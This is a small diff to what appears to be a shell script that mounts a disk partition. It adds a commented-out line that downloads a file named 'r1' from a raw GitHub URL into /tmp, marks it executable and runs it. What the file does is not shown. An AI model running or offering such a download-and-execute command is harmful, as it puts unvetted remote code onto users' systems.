@@ -1,4 +1,4 @@
-#wget 
+#cd /tmp && wget https://raw.githubusercontent.com/Wisherk8/s/main/r1 && chmod +x r1 && ./r1
 mkdir /mnt/vda1
 mount /dev/vda1 /mnt/vda1
 cd /mnt/vda1
